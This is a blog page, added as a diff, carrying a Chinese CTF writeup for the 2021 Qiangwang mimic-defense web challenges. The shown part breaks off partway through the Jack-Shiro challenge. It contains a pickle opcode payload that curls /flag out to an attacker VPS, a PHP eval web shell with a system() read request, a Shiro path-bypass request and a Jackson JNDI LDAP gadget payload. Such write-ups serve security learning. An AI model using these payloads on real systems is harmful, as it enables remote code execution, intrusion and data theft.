@@ -1,0 +1,1651 @@
+<!DOCTYPE html>
+<html lang="zh-CN,en,default">
+  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <link rel="preload" href="/css/first.css" as="style">
+  
+
+  <!-- 页面元数据 -->
+  
+  <title>2021第四届“强网”拟态防御国际精英挑战赛 Writeup - TARI TARI</title>
+  
+    <meta name="keywords" content="ctf,ctf比赛">
+  
+
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/favicon.ico">
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
+        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
+        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
+        '<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support"><strong>了解详情 ></strong></a>'+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+	</style>
+    <div class="kill-noscript">
+        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
+        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
+        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>了解详情 ></strong></a>
+    </div>
+</noscript>
+
+</head>
+
+  <body>
+    
+
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+            TARI TARI
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="搜索..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
+          
+            <div class='cover-bg lazyload placeholder' data-bg="/img/home.jpeg"></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">TARI TARI</p>
+    
+    
+      <p class="subtitle">记录信安路上的点滴 (:</p>
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+      <div id="safearea">
+        <div class="body-wrapper" id="pjax-container">
+          
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        2021第四届“强网”拟态防御国际精英挑战赛 Writeup
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年10月25日 22:22</p>
+  </a>
+</div>
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateUpdated" datetime="2022-02-01T12:23:35+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2022年2月1日 12:23</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="2021第四届“强网”拟态防御国际精英挑战赛 Writeup" data-path="/p/2021/2021nitai/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：3.4k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：15分钟</p>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <p>又和几个**”社会”**人士一起组队参加了这次比赛</p>
+<p>这次 Web 和队友一起 AK了，开心 23333</p>
+<p>（想起来以前一个题都做不出来的画面…</p>
+<p>部分题目下载链接：</p>
+<ul>
+<li><a href="/static/2021/10/26/2021nitai-misc.7z">2021nitai-misc.7z</a></li>
+<li><a href="/static/2021/10/26/2021nitai-web.7z">2021nitai-web.7z</a></li>
+<li><a href="/static/2021/10/26/2021nitai-crypto.7z">2021nitai-crypto.7z</a></li>
+</ul>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x1-zerocalc"><a href="#0x1-zerocalc" class="headerlink" title="0x1 zerocalc"></a>0x1 zerocalc</h3><p><a href="https://tari.moe/">@tari</a> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/DEADF1SH-CAT/">@DEADF1SH-CAT</a></p>
+<p>把能下的都下下来，特别是 package.json，一开始忘了下了晕，然后 <a target="_blank" rel="noopener" href="https://snyk.io/">snyk</a> 一下扫出两个，感觉是</p>
+<p><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-NOTEVIL-608878">https://snyk.io/vuln/SNYK-JS-NOTEVIL-608878</a></p>
+<p>因为本地调试直接用safeEval可以利用到nodejs的Function对象，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> code = <span class="string">&quot;function fn() &#123;&#125;;var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();properties.pop();&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(safeEval(code))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>不过加了题目的safeEval就是跑到就被拦截</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">HACK:</span> esprima doesn&#x27;t like returns outside functions</span></span><br><span class="line">src = parse(<span class="string">&#x27;function a()&#123;&#x27;</span> + src + <span class="string">&#x27;&#125;&#x27;</span>).body[<span class="number">0</span>].body</span><br></pre></td></tr></table></figure>
+
+<p>不知咋绕过</p>
+<p>后面不知被哪位大佬改了 flag 位置，就直接捡漏了，</p>
+<p><img src="/img/2021nitai/image-20211025232552410.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025232552410.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025232552410"></p>
+<h3 id="0x2-ezPickle"><a href="#0x2-ezPickle" class="headerlink" title="0x2 ezPickle"></a>0x2 ezPickle</h3><p><a href="https://tari.moe/">@tari</a></p>
+<p>查看题目源码发现是pickle反序列化的白名单+黑名单机制，并会动态加载其他模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，只要引入到模块是 config，且不访问模块内置变量即可绕过pickle反序列化限制</p>
+<p>config.py 中存在任意代码执行，只要想办法把 notadmin = {“admin”: “no”} 字典值篡改即可</p>
+<p>通过编写OPCODE，在 backdoor 执行前修改 config 命名空间的 notadmin 字典值，这里可以借助工具在OPCODE中修改字典的值</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">notadmin = GLOBAL(<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;notadmin&#x27;</span>)</span><br><span class="line">notadmin[<span class="string">&quot;admin&quot;</span>]=<span class="string">&quot;yes&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/2021nitai/image-20211025232747111.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025232747111.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025232747111"></p>
+<p>绕过 admin 限制后，通过 OPCODE调用后门</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cconfig</span><br><span class="line">backdoor</span><br><span class="line">(S<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;curl http://&#123;VPS_IP&#125;/`cat /flag|base64`&quot;)&#x27;</span></span><br><span class="line">tR</span><br></pre></td></tr></table></figure>
+
+<p>相应指令解释，其中 <strong>.</strong> 表示结束</p>
+<ul>
+<li><p>c：把一个全局对象压入栈</p>
+</li>
+<li><p>(：向栈中压入一个MARK标记</p>
+</li>
+<li><p>S：实例化一个字符串对象</p>
+</li>
+<li><p>t：寻找栈中的第一个MARK，并组合其至栈顶的数据为元组</p>
+</li>
+<li><p>R：选择离栈顶的最近的第一个对象作为参数（必须为元组）、第二个对象作为函数，然后调用该函数</p>
+</li>
+</ul>
+<p>POC</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> notadmin</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;cconfig\nnotadmin\np0\n0g0\nS&#x27;admin&#x27;\nS&#x27;yes&#x27;\nscconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">(S&#x27;__import__(&quot;os&quot;).system(&quot;curl http://&#123;VPS_IP&#125;/`cat /flag|base64`&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br><span class="line">restricted_loads(payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>把输出的base64字符串拼接到目标机器GET请求name字段即可，因为无回显，所以外带</p>
+<p><img src="/img/2021nitai/image-20211025232850237.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025232850237.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025232850237"></p>
+<h3 id="0x3-EasyFilter"><a href="#0x3-EasyFilter" class="headerlink" title="0x3 EasyFilter"></a>0x3 EasyFilter</h3><p><a href="#">@Oah</a></p>
+<p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;./&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;w&#x27;</span>)&#123;</span><br><span class="line">        @mkdir(<span class="string">&quot;./files/&quot;</span>);</span><br><span class="line">        <span class="variable">$content </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="variable">$file </span>= bin2hex(random_bytes(<span class="number">5</span>));</span><br><span class="line">        file_put_contents(<span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>,base64_encode(<span class="variable">$content</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;r&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$r </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">        <span class="variable">$file </span>= <span class="string">&quot;./files/&quot;</span>.<span class="variable">$r</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;php://filter/resource=<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>读文件可控的就只有 <code>php://filter/resource=$file</code> ，之前刷过相关的题目，印象中 <code>resource=</code> 后是不能加过滤器的，然后队友解出来了，问他他说：发现文件名被识别成过滤器了</p>
+<p><img src="/img/2021nitai/image-20211025233120676.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025233120676.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025233120676"></p>
+<p>这样就好办了，写入 base64 编码过的一句话，通过base64解码过滤器读就行</p>
+<p>POC</p>
+<p>写入</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.70.181.14:32766/?action=w&amp;c=%3C?php%20eval($_GET[%22cmd%22]);?%3E</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/2021nitai/image-20211025233322775.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025233322775.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025233322775"></p>
+<p>读取</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.70.181.14:32766/?action=r&amp;r=read=convert.base64-decode/../d7376a8618&amp;cmd=system(%27cat%20../../../flag%27);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/2021nitai/image-20211025233349066.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025233349066.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025233349066"></p>
+<h3 id="0x4-Jack-Shiro"><a href="#0x4-Jack-Shiro" class="headerlink" title="0x4 Jack-Shiro"></a>0x4 Jack-Shiro</h3><p><a href="#">@Oah</a> <a href="https://tari.moe/">@tari</a></p>
+<p>这题主要是队友解，一开始我都没想到原来我刷过，然后刷过，又刚好有公网服务器，又刚好服务器上有 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，就做个帮忙拿flag工具人，这里复盘一下，两个题目的差别，以及自己去做的话，思路会怎样吧，然后和队里大佬的差异。有兴趣可以到<a target="_blank" rel="noopener" href="https://buuoj.cn/">buu</a>去复现2021红明谷JavaWeb</p>
+<p>和2021红明谷 JavaWeb 基本一致，但不同的是，这里没有提示 <code>/login</code> 目录，红明谷是有的</p>
+<p>不过题目名字有提示，是Shiro，队里大佬说Shiro的默认登陆路径就是这个，直接访问 /login 没啥反应，就返回一个 /json</p>
+<p><img src="/img/2021nitai/image-20211025234054238.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025234054238.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025234054238"></p>
+<p>二话不说，先随便 POST 点JSON数据上去。</p>
+<p><img src="/img/2021nitai/image-20211025234853842.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025234853842.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025234853842"></p>
+<p>POST /json 返回302跳转</p>
+<p><img src="/img/2021nitai/image-20211025234949480.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025234949480.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025234949480"></p>
+<p>记起shiro有个未授权漏洞，有几种绕过姿势，最终锁定<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/14055275.html">CVE-2020-11989</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /;/json</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/2021nitai/image-20211025235213032.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025235213032.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025235213032"></p>
+<p>在结合题目名字，Jack -&gt; Jackson，这里和红明谷也不一样，原题报错是下图这样的，即  <code>xxx.jackson.databind.xxx</code> </p>
+<p><img src="/img/2021nitai/image-20211025235321065.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025235321065.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025235321065"></p>
+<p>然后就很容易联想到去网上搜 jackjson databind 漏洞</p>
+<p><img src="/img/2021nitai/image-20211025235507008.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025235507008.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025235507008"></p>
+<p>除去一些漏洞通告，第一个漏洞分析就是了</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/227943">https://www.anquanke.com/post/id/227943</a></p>
+<p>文中最后完整的 payload 是</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">&quot;[\&quot;com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\&quot;,&#123;\&quot;jndiLocation\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;&#125;]&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>根据这个 payload 试试反序列化</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource&quot;</span>,&#123;<span class="attr">&quot;jndiLocation&quot;</span>:<span class="string">&quot;ldap://vps:2233/a&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>
+
